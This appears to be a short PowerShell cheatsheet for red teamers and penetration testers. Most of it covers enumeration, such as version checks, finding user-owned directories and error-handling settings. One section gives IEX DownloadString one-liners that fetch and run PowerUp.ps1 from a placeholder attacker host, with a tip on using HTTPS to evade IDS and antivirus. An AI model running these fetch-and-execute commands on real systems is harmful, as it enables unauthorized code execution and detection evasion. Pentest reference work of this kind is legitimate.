# Powershell Cheatsheet - For RT / PT
## Information about this repository
Q: What is this cheatsheet supposed to be?

This is going to be my powershell cheatsheet (probably won't be the best but I hope you can take a few things from here)

Q: Who is this made for?

Made for red teamers / penetration testers / blue teamers ( / sysadmins if you really feel like it)

Q: Which versions of powershell will this be supporting?

From powershell v2 onwards (even though I will be putting things that are not supported in powershell v2).

The obligatory `please do not use this cheatsheet for any illegal or malicious activities.`

## Useful commands
### Enumeration

This will be a place for enumeration commands.

#### Checking powershell version different methods:
##### Registry
```Powershell
(Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine -Name 'PowerShellVersion').PowerShellVersio
```
##### $host Variable
```Powershell
$host.Version
```
##### Get-Host
```Powershell
(Get-Host).Version
```
##### $PSVersionTable Variable
```Powershell
$PSVersionTable.PSVersion
```

### Password / Hidden data

This will be a place for finding passwords or hidden data.

### Read / Writable files

This is going to assist you in detecting faulty permissions.
##### Get all directories with ownership
```Powershell
foreach ($file in (Get-ChildItem -Directory -Path "C:\Users" -Recurse -Force -ErrorAction SilentlyContinue)) { Get-Acl $file.FullName | Where-Object -Property Owner -eq ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) | Select -ExpandProperty Path | Convert-Path}
```
##### Short explanation: We are looping over each directory and file with Get-ChildItem, then extracting the ACLs from the file / directory and checking if the owner is the current user account with `[System.Security.Principal.WindowsIdentity]::GetCurrent().Name`, the rest is just for prettifying and expanding.


### Execute powershell scripts on the target
##### Download from share
```Powershell
IEX(New-Object System.Net.WebClient).DownloadString('//<attacker_ip>/share/PowerUp.ps1')
```

##### Download from http server 
```Powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>:8090/PowerUp.ps1')
```
##### Note: For encrypted communication and bypassing any IDS or antiviruses you could use https:// instead. 

### Misc.
#### Error handling 
```Powershell
$ErrorActionPreference = "SilentlyContinue" # / "Stop" / "Inquire" / "Continue" (Default) / "Suspend"
```
#### Test if 32-bit system or 64-bit
```Powershell
[Environment]::Is64BitOperatingSystem
```

## Sources
- https://github.com/specterops/at-ps (Amazing course, very recommended)
- The interwebz
- My personal journey
- https://adamtheautomator.com/check-powershell-version/
- https://www.gngrninja.com/script-ninja/2016/6/5/powershell-getting-started-part-11-error-handling
